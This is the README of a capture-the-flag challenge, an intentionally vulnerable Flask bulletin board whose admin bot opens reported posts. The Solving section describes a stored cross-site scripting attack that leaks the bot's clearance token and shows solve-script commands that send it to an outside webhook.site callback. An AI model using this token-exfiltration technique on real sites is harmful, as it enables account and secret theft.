# OrbitBoard — A Loose Wire

A crew bulletin board for Space Station Orion-7. Anyone can register, post a
message, and report suspicious posts to Officer Vega for review. Officer
Vega's review bot logs in and actually opens whatever gets reported to her.

## Project structure

```
orbitboard/
  Makefile              # build / push / run / dist / install / sync
  challenge.yml         # CTF platform metadata
  sol.py                # reference exploit / solve script
  challenge/
    docker-compose.yml
    app/                # Flask bulletin board (site)
    bot/                # Playwright bot that plays "Officer Vega"
```

## Running locally

```bash
make run
```

This builds and starts both containers via `challenge/docker-compose.yml`.
Open http://localhost:3000. The `FLAG` env var in `docker-compose.yml` is a
placeholder for local testing; the real flag only exists on the live
instance.

## Environment variables

**site** (`challenge/app`)
| Variable       | Purpose                                          |
|----------------|---------------------------------------------------|
| `FLAG`         | Flag returned by `/solve` on a correct token       |
| `BOT_URL`      | Internal URL of the bot's `/visit` HTTP API        |
| `BOT_PASSWORD` | Officer Vega's password (shared with the bot)      |
| `PORT`         | Port the Flask app listens on (default `5000`)     |

**bot** (`challenge/bot`)
| Variable          | Purpose                                            |
|-------------------|-----------------------------------------------------|
| `SITE_URL`        | Base URL of the site the bot should visit          |
| `BOT_USERNAME`    | Officer Vega's login (default `officer_vega`)      |
| `BOT_PASSWORD`    | Must match the site's `BOT_PASSWORD`               |
| `PORT`            | Port the bot's internal HTTP API listens on        |
| `MAX_CONCURRENCY` | Max concurrent browser visits                      |
| `DEFAULT_WAIT_MS` | How long the bot lingers on a reported page         |

## Solving

The post page renders content unescaped and appends the *viewer's own*
clearance token right after it. Get Officer Vega's bot to render your post
and leak her clearance token back to you, then submit it at `/solve`.

```bash
python3 sol.py --site http://localhost:3000 --callback http://webhook.site/<id>
python3 sol.py --token <zeton>
```

See the docstring in [sol.py](sol.py) for details on reaching the bot from
a remote instance.
